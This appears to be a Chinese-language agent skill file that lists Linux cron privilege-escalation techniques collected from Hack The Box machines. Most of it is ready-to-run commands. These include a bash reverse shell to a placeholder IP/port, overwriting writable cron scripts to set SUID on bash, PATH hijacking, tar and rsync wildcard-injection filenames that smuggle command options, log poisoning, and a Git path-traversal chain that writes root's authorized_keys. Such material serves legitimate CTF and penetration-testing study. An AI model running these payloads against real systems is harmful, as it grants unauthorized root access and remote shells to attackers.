---
name: 'cron-privesc-patterns'
description: 'Cron Job Abuse 提权模式库：可写脚本/PATH劫持/通配符注入(tar + rsync -e)/日志投毒/@reboot + 🆕Git Template Sync路径穿越。来自20+台HTB机器统计。（检索词：cron/wildcard/rsync/tar/privesc/patterns）'
metadata: { domain: linux, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Cron Job Abuse 提权模式库

> 来自 350+ HTB 机器统计: Easy 10台 + Medium 11台 + Hard/Insane 多台 = **20+ 台机器**用 cron 提权。是最常见的 Linux 提权向量之一。

## 模式 1: 可写脚本 (Writable Script) — 最常见

```bash
# 发现
ls -la /etc/cron.* 2>/dev/null
cat /etc/crontab
crontab -l
systemctl list-timers --all
ps aux | grep cron

# 检查可写性
find /etc/cron* -writable 2>/dev/null
find /var/spool/cron -writable 2>/dev/null

# 利用
echo '#!/bin/bash' > /path/to/cron_script.sh
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
# 或反弹 shell:
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /path/to/cron_script.sh
```

## 模式 2: PATH Hijack（PATH 劫持）

```bash
# cron 脚本用相对路径调用命令？→ PATH 劫持
cat /etc/crontab | grep -v '^#'
# script.sh 里用了: cp /tmp/foo /var/backup/
# 劫持 cp
echo '#!/bin/bash' > /tmp/cp
echo 'chmod +s /bin/bash' >> /tmp/cp
chmod +x /tmp/cp
```

## 模式 3: 通配符注入 (Wildcard Injection)

**原语**：root cron 调用 `命令 ... *`，且该目录对你可写 → `*` 展开出的**文件名会被当成选项解析**。
与具体命令无关，只要求三个条件：**通配符 + 目录可写 + 命令接受危险选项**。

### 3.1 tar 系（`tar cf ... *`）
```bash
touch '--checkpoint=1'
touch '--checkpoint-action=exec=bash shell.sh'
# tar cf ... * 时, * 展开为文件名 → tar 参数注入
```

### 3.2 rsync 系（`rsync ... local*.rdb remote:`）— 最易被忽略
rsync 同样把文件名当选项解析，其中 **`-e` 可指定远端 shell** → 直接命令执行。

```bash
# ① 先放一个「能被通配符匹配到」的 payload 脚本（名字必须匹配 cron 里的通配模式）
cat > reddish.rdb <<'EOF'
#!/bin/sh
cp /bin/dash /var/tmp/privesc
chmod 4755 /var/tmp/privesc
EOF

# ② 再造一个「文件名本身就是选项」的文件（关键：文件名 = "-e sh <payload>"）
touch -- '-e sh reddish.rdb'

# ③ cron 的 rsync 带 * 展开时会把两个都当参数：
#    rsync -e sh reddish.rdb ... → 以 root 执行 payload
#    → /var/tmp/privesc 成为 SUID root
/var/tmp/privesc -p
```

🔴 **两个名字必须对**：
- **payload 文件名**必须能被 cron 里的通配模式匹配到（cron 写 `local*.rdb`，就要叫 `localxxx.rdb`），
  否则不会被 `*` 展开进去；
- **选项文件名**必须精确写成 `-e sh <payload文件名>`。

```bash
# 检测信号：root cron 里有 rsync + 通配符，且目标目录对当前用户可写
grep -r 'rsync' /etc/cron.d/ /etc/crontab 2>/dev/null | grep '\*'
```

## 模式 4: Cron + 日志/邮件投毒

```bash
# cron 脚本读取日志或邮件 → 投毒输入
echo "ERROR; /bin/bash -c '...'" >> /var/log/app.log
```

## 模式 5: @reboot Cron（重启触发）

```bash
crontab -l | grep @reboot
# 如果指向可写脚本 → 写入 → 等重启
```

## 🆕 模式 6: Git Template Sync 路径穿越（来源 Nexus）

```bash
# 特征: systemd timer 定期从 Git repo 同步文件
systemctl list-timers --all | grep -i "git\|sync\|template"

# 审计关键点:
# 1. timer 以什么用户运行？（root?）
# 2. 脚本是否用 os.path.join() 拼接 git ls-tree 输出的路径？
# 3. 攻击者能否控制 Git repo？（能 push？能创建 template repo？）
```

**利用链**:
1. 创建 Gitea template 仓库
2. 手工构造 Git 对象含 `..` 路径穿越（绕过 git 前端校验）
3. Push → timer 触发 → `os.path.join` 规范化 `..` → 写任意文件（如 `/root/.ssh/authorized_keys`）

详见 git-object-path-traversal

### HTB 案例：Nexus
| 组件 | 详情 |
|------|------|
| Timer | `gitea-template-sync.timer`（每分钟，root） |
| 脚本 | `/etc/gitea/template-sync.py` |
| 漏洞点 | `os.path.join(stage_path, filepath)` — filepath 来自 `git ls-tree -r` |
| 利用 | 手工构造 Git tree entry `..` → push → timer 写 `/root/.ssh/authorized_keys` |

## 快速检查清单

```bash
[ ] cat /etc/crontab; ls -la /etc/cron.*/
[ ] crontab -l 2>/dev/null; ls /var/spool/cron/crontabs/ 2>/dev/null
[ ] systemctl list-timers --all 2>/dev/null
[ ] 每个 cron 脚本的权限: ls -la <script_path>
[ ] 脚本内容审计: cat <script> → 相对路径？→ PATH hijack
[ ] 脚本内容: tar/rsync/chown + * → 通配符注入
[ ] 脚本读取的输入文件: 可写？→ 投毒
[ ] /tmp 下的脚本: 竞态条件？→ 替换
[ ] 🆕 脚本用了 git ls-tree？→ 路径穿越
[ ] 🆕 脚本用了 os.path.join 且第二个参数来自外部？→ 路径穿越
```

## 教训

1. **Cron 是 Linux 提权的第二大门（仅次于 sudo）** — 每台必查
2. **不要只看 /etc/crontab** — 还有 /etc/cron.d/, /var/spool/cron, systemd-timers, incron
3. **相对路径在 cron 脚本中 = 致命** — cron PATH = /usr/bin:/bin 极简
4. **tar/rsync 的通配符展开 = 参数注入原语**
5. 🆕 **os.path.join + git ls-tree = 路径穿越** — Python 规范化路径时 `..` 会被解析
6. 🆕 **Git 对象层无路径校验** — 手工构造 raw object 可绕过 git 前端的路径限制
